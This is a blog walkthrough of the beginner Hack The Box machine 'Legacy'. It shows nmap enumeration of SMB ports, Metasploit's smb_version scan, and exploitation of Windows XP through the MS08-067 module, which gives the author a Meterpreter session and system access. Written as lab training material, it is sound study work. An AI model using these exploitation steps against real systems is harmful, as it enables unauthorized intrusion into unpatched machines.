---
title: Legacy
date: 2020-05-04 19:16:00
description: HTB Walkthrough
featured_image: '/images/blog/legacy/legacy.jpg'
tags: ['Hack The Box']
---

Legacy is also one of the first machines released on Hack The Box (HTB) and aimed for beginners. It is a Windows box that is vulnerable to SMB bugs and I'll be using Metasploit to exploit them.

## Hack The Box
 
* Operating System: Windows
* Difficulty: Easy


## Enumeration

Let's start with enumeration by using nmap. As always, I like to use:

<img src="/images/blog/legacy/ipaddress.jpg" alt="nmap scan">

	PORT     STATE  SERVICE       VERSION
	139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
	445/tcp  open   microsoft-ds  Windows XP microsoft-ds
	3389/tcp closed ms-wbt-server
	Device type: general purpose|specialized
	Running (JUST GUESSING): Microsoft Windows XP|2003|2000|2008 (94%), General Dynamics embedded (87%)
	OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_server_2008::sp2
	Aggressive OS guesses: Microsoft Windows XP SP3 (94%), Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows XP (92%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows XP SP2 or Windows Server 2003 (90%), Microsoft Windows 2000 SP4 (90%), Microsoft Windows XP SP2 or SP3 (90%), Microsoft Windows 2000 SP4 or Windows XP SP2 or SP3 (90%), Microsoft Windows 2003 SP2 (89%), Microsoft Windows XP SP2 (89%)
	No exact OS matches for host (test conditions non-ideal).
	Network Distance: 2 hops
	Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

	Host script results:
	|_clock-skew: mean: 5d00h30m01s, deviation: 2h07m16s, median: 4d23h00m01s
	|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:34:e8 (VMware)
	| smb-os-discovery: 
	|   OS: Windows XP (Windows 2000 LAN Manager)
	|   OS CPE: cpe:/o:microsoft:windows_xp::-
	|   Computer name: legacy
	|   NetBIOS computer name: LEGACY\x00
	|   Workgroup: HTB\x00
	|_  System time: 2020-05-24T02:40:58+03:00
	| smb-security-mode: 
	|   account_used: <blank>
	|   authentication_level: user
	|   challenge_response: supported
	|_  message_signing: disabled (dangerous, but default)
	|_smb2-time: Protocol negotiation failed (SMB2)


It looks like we have port 139 and 445 open, and based on the nmap scan, we might have also found the SMB OS, *Windows XP*. Before we exploit this box, let's verify that the OS is the right one by using one of Metasploit's auxiliary modules.

### SMB Information

To open up Meatsploit whilst in the command line interface, type in:

`msfconsole`

Once Metasploit opens, we can use Metasploit's auxiliary module, smb_version. There are a lot of auxiliary modules, so if you're not sure which one to use, we can search for it by typing in Metasploit: 

`search smb_version`

<img src="/images/blog/legacy/smbversion.jpg" alt="smb version">

From the search results, we can see that there is an auxiliary module called smb_version. To use it, we can type in Metasploit:

`use auxiliary/scanner/smb/smb_version`

As always, I like to see what options I have when I use a Metasploit module by typing in `options`. After taking a look at the options, I set the following: 

* `rhosts`: The IP address of the Legacy box.
* `target`: To see if there are any targets to set--in this case, there is none.
* `run`: To run the auxiliary module.

<img src="/images/blog/legacy/auxiliary.jpg" alt="auxiliary scan">

Perfect! Based on the results above, the box is currently running *Windows XP SP3*. Now that we have confirmed the OS that the SMB is on, let's look for any existing exploits.

In the last box (Lame), we used Metasploit's search feature to find an exploit. This time to make it interesting, we can use Google search. I normally like to look for results from Rapid7 (which is the same as Metasploit) or Exploit-db.

After searching <i>Windows XP SP3 exploit</i> in Google search, I came across this one from Rapid 7:

<a href="https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi">MS08-067 Microsoft Server Service Relative Path Stack Corruption</a>

Here's what it says on the exploit's description:

<i>This module exploits a parsing flaw in the path canonicalization code of NetAPI32.dll through the Server Service. This module is capable of bypassing NX on some operating systems/service packs.</i>

This exploit looks promising, so let's try using it.

## Exploitation

To use the exploit that we found, we can follow the instructions found in the above link and type in:

`use exploit/windows/smb/ms08_067_netapi`

Again, let's take a look at our options by typing in `options`. 


<img src="/images/blog/legacy/exploit.jpg" alt="preparing exploit">

In this case, I set the rhost to the IP address of the box, 10.10.10.4, by typing in:

`set rhosts 10.10.10.4`

And that's it, let's try running the exploit!

<img src="/images/blog/legacy/runexploit.jpg" alt="exploit results">

It worked! We now have a Meterpreter session. Meaning, we have access to the box. We can type in:


* `getuid`: To see what access level we have.
* `pwd`: To check which directory we're currently in.
 

Since we have root access, we can type in `shell` to that we have access to the command line and locate the root.txt and user.txt file.

And that's it! We've now completed the Legacy box.

## Conclusion

This goes to show that once you find a port open, in this case, SMB, always enumerate to find out what OS version the service is running. Once you know the version, it'll be easier to find out what the system is vulnerable to and where to look when it comes to finding exploits. 